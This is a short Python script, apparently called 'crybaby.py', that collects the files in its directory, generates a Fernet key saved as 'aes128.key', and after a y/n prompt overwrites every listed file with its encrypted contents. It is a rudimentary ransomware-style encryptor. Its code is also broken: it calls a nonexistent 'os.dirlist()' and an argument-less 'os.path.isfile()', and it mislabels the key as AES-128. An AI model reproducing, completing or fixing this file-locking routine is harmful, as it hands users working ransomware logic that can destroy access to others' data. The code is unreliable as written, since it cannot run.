#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.dirlist():
        if file == "crybaby.py" or file  == "aes128.key":
            continue
        if  os.path.isfile():
            files.append(file)

print(files)
key = Fernet.generate_key()

with open("aes128.key","wb") as thekey:
        thekey.write(key)

uinput = input("encrypt theese files? y/n ")
if uinput == "y":
    for file in files:
            with open(file, "rb") as dumbfile:
                conts = dumbfile.read()
            encrypted_conts = Fernet(key).encrypt(conts)
            with open(file,"wb") as dumbfile:
                dumbfile.write(encrypted_conts)
else:
    quit();
